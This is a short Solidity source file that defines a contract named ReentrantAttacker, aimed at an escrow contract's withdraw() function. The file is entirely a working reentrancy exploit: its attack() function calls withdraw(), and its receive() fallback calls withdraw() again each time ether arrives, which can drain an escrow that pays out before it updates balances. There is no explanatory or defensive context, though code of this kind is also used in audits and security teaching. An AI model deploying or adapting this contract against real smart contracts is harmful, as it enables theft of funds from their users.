// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IEscrow {
    function withdraw() external;
}

contract ReentrantAttacker {
    IEscrow public escrow;

    constructor(address _escrow) {
        escrow = IEscrow(_escrow);
    }

    // Fallback re-enter withdraw()
    receive() external payable {
        escrow.withdraw();
    }

    function attack() external {
        escrow.withdraw(); // initial call triggers fallback
    }
}
